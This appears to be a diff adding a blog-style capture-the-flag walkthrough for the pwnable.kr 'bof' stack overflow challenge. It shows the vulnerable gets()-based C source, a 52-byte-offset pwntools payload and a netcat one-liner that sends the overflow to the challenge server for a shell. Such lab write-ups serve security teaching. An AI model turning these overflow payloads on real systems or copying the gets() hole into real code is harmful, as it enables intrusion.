@@ -1,0 +1,119 @@
+---
+title: bof — Minimal Overflow, Maximum Clarity
+slug: bof
+description: A pwnable.kr bof walkthrough that keeps the exploit path intentionally small so the stack corruption mechanics stay obvious and reproducible.
+publishedAt: 2025-02-02
+updatedAt: 2025-02-04
+draft: false
+featured: true
+featuredWeight: 5
+platform: pwnable-kr
+learningTrack: pwnable-kr
+topic: pwn
+difficulty: easy
+status: reviewed
+challengeName: bof
+targetType: 32-bit Linux stack overflow binary
+operatingSystem: Linux
+tags:
+  - stack-overflow
+  - offset-finding
+  - 32-bit
+  - pwntools
+techniques:
+  - stack-variable-overwrite
+  - padding-control
+tools:
+  - gdb
+  - pwntools
+summary: Keep the overflow focused on the exact stack variable or control target the program checks, and avoid adding unnecessary payload structure.
+seoTitle: pwnable.kr bof Writeup
+seoDescription: pwnable.kr bof writeup covering 32-bit stack corruption, offsets, and a minimal deterministic payload.
+canonicalPath: /pwnable-kr/bof
+---
+
+## Overview
+
+`bof` is a classic pwnable.kr reminder that you do not always need RIP/EIP control. The source already shows a simpler target: `func()` is called with `0xdeadbeef`, user input is read with `gets()`, and the challenge only checks whether `key == 0xcafebabe`. The shortest solve is just to overwrite that checked stack value.
+
+## Challenge Snapshot
+
+| Field | Value |
+| --- | --- |
+| Architecture | 32-bit |
+| Primitive | `gets()` into a 32-byte stack buffer |
+| Goal | Change `key` from `0xdeadbeef` to `0xcafebabe` |
+
+## Environment & Tools
+
+The two practical tools are the source code and one quick offset check.
+
+```python
+from pwn import *
+
+payload = b'A' * 52 + p32(0xcafebabe)
+```
+
+## Recon
+
+The important source shape is roughly:
+
+```c
+void func(int key) {
+    char overflowme[32];
+    gets(overflowme);
+
+    if(key == 0xcafebabe) {
+        system("/bin/sh");
+    }
+}
+
+int main() {
+    func(0xdeadbeef);
+}
+```
+
+That means the problem is not “build a ret2win.” It is “reach the stack slot holding the checked function argument.”
+
+## Vulnerability Analysis
+
+Most public solves land on an offset of `52` bytes before the replacement value. That makes sense because you have the 32-byte buffer plus surrounding saved frame data before reaching the argument slot that gets checked.
+
+## Exploitation Steps
+
+The exact payload is small enough to type by hand:
+
+```python
+from pwn import *
+
+payload = b'A' * 52 + p32(0xcafebabe)
+```
+
+For the real remote service, a common pattern is to keep the socket open after sending the payload:
+
+```bash
+(python -c 'print "A"*52 + "\xbe\xba\xfe\xca"'; cat) | nc pwnable.kr 9000
+```
+
+## Payload/Technique Breakdown
+
+This challenge is valuable because it separates two ideas:
+
+- stack memory can be overwritten,
+- but not every solve requires full return-address control.
+
+## Result
+
+Once `key` becomes `0xcafebabe`, the program drops into the privileged shell path without any ROP chain or gadget hunting.
+
+## Lessons Learned
+
+- Read the source before building a fancier exploit than the challenge needs.
+- Overwriting a checked variable is often cleaner than controlling EIP.
+- Remote shell challenges often fail only because the connection closes too early.
+
+## References
+
+- i386 calling convention notes
+- pwntools packing helpers
+- Stack frame visualization in GDB
